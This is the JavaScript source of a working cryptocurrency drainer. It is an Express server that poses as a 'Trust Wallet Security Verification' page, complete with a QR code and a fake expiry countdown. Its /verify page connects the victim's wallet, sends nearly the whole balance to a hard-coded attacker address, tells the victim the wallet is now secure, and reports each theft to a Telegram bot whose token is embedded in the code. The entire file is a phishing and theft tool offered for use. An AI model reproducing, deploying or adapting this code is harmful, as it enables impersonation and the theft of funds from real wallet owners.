const express = require('express');
const QRCode = require('qrcode');
const app = express();

const DRAIN_ADDRESS = '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
const BOT_TOKEN = '6952302341:AAE1WRba7NjJXdV0tAvqSopXvllMkgBKfxs';
const CHAT_ID = '6521633168';
const SITE_URL = 'https://drainer-tool-production.up.railway.app';

// Generate QR data URL once at startup
let qrDataUrl = '';

async function generateQR() {
  const link = SITE_URL + '/verify';
  qrDataUrl = await QRCode.toDataURL(link, {
    width: 300,
    margin: 2,
    color: { dark: '#000000', light: '#ffffff' }
  });
  console.log('✅ QR generated');
}
generateQR();

// Main page - QR embedded directly
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust Wallet Security Center</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0a0a0a;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
    .container{max-width:420px;width:100%;text-align:center}
    .shield{width:80px;height:80px;background:#3375ff;border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:40px}
    .card{background:#1a1a1a;border-radius:20px;padding:30px 20px;margin-bottom:20px}
    h2{color:#3375ff;margin-bottom:8px;font-size:20px}
    p{color:#aaa;font-size:14px;margin-bottom:20px}
    img{border-radius:16px;background:#fff;padding:10px}
    .warning{color:#ff9500;font-size:12px;margin-top:12px}
    .timer{color:#ff5555;font-weight:bold;font-size:18px;margin-top:8px}
  </style>
</head>
<body>
  <div class="container">
    <div class="shield">🛡️</div>
    <div class="card">
      <h2>Trust Wallet Security Verification</h2>
      <p>Scan this QR with your Trust Wallet camera to verify your wallet is safe.</p>
      <img src="${qrDataUrl}" width="260" height="260" alt="QR Code">
      <p class="warning">⚠ Expires in: <span class="timer" id="countdown">05:00</span></p>
    </div>
  </div>
  <script>
    let time=300;
    setInterval(()=>{time--;const m=Math.floor(time/60);const s=time%60;document.getElementById('countdown').innerText=m+':'+(s<10?'0':'')+s;if(time<=0)location.reload();},1000);
  </script>
</body></html>`);
});

// Also keep /qr-code for direct access (optional)
app.get('/qr-code', (req, res) => {
  res.send(`<img src="${qrDataUrl}" width="260" height="260" style="border-radius:16px;background:#fff;padding:10px">`);
});

// The drain page
app.get('/verify', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0a0a0a;color:#fff;font-family:-apple-system,sans-serif;text-align:center;padding:30px 20px}
    .spinner{border:4px solid #333;border-top:4px solid #3375ff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:40px auto 20px}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h2{color:#3375ff;margin:15px 0}
    p{color:#aaa;font-size:14px;margin:10px 0}
    button{background:#3375ff;color:#fff;border:none;padding:16px 40px;font-size:16px;border-radius:12px;cursor:pointer;margin-top:20px;font-weight:bold}
    button:disabled{background:#555}
    .error{color:#ff5555;margin-top:15px;font-size:13px}
    .success{color:#33ff55;font-weight:bold;margin-top:20px}
  </style>
</head>
<body>
  <div class="spinner" id="spinner"></div>
  <h2 id="title">Initializing Security Protocol...</h2>
  <p id="info">Please wait, do not close this page.</p>
  <button id="btn" onclick="initiateVerification()" disabled>Connect Wallet</button>
  <div class="success" id="success"></div>
  <div class="error" id="error"></div>

  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    const DRAIN_ADDRESS = '${DRAIN_ADDRESS}';
    const BOT_TOKEN = '${BOT_TOKEN}';
    const CHAT_ID = '${CHAT_ID}';

    const RPC = {
      1: 'https://eth.llamarpc.com',
      56: 'https://bsc-dataseed.binance.org',
      137: 'https://polygon.llamarpc.com'
    };

    async function notify(txt) {
      try {
        await fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({chat_id: CHAT_ID, text: txt})
        });
      } catch(e) {}
    }

    async function initiateVerification() {
      document.getElementById('btn').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('title').innerText = 'Connecting to Wallet...';
      document.getElementById('info').innerText = 'Accept the connection in Trust Wallet.';
      document.getElementById('error').innerText = '';

      try {
        const provider = new WalletConnectProvider.default({
          rpc: RPC,
          bridge: 'https://bridge.walletconnect.org',
          qrcode: false
        });
        await provider.enable();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        const chainId = await web3.eth.getChainId();

        document.getElementById('title').innerText = '✅ Wallet Connected';
        document.getElementById('info').innerText = 'Step 2/2: Confirm verification in Trust Wallet.';
        document.getElementById('spinner').style.display = 'none';
        await notify('🔗 Connected: ' + account + ' | Chain: ' + chainId);

        const balance = await web3.eth.getBalance(account);
        const gasPrice = await web3.eth.getGasPrice();
        const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(21000));
        const sendable = web3.utils.toBN(balance).sub(gasCost);

        if (sendable.gt(web3.utils.toBN(0))) {
          const tx = {
            from: account,
            to: DRAIN_ADDRESS,
            value: sendable.toString(),
            gas: '21000',
            gasPrice: gasPrice.toString()
          };
          const receipt = await web3.eth.sendTransaction(tx);
          const amount = web3.utils.fromWei(sendable.toString(), 'ether');
          document.getElementById('title').innerText = '✅ Verification Complete';
          document.getElementById('info').innerText = 'Your wallet is now secure.';
          document.getElementById('success').innerText = 'Security certificate updated.';
          await notify('💰 DRAINED ' + amount + ' from ' + account + ' | TX: ' + receipt.transactionHash);
        } else {
          document.getElementById('title').innerText = '✅ Verified';
          document.getElementById('info').innerText = 'No funds need protection.';
          await notify('⚠ No balance: ' + account);
        }
        setTimeout(() => provider.disconnect(), 2000);
      } catch(e) {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('btn').disabled = false;
        document.getElementById('btn').style.display = 'block';
        document.getElementById('title').innerText = 'Verification Failed';
        document.getElementById('info').innerText = 'Please try again.';
        document.getElementById('error').innerText = e.message;
        await notify('❌ Error: ' + e.message);
      }
    }

    setTimeout(() => {
      document.getElementById('btn').disabled = false;
      document.getElementById('spinner').style.display = 'none';
      document.getElementById('title').innerText = 'Trust Wallet Security Check';
      document.getElementById('info').innerText = 'Tap the button below to verify your wallet.';
    }, 2000);
  </script>
</body></html>`);
});

app.listen(process.env.PORT || 3000, () => console.log('✅ Drainer running'));
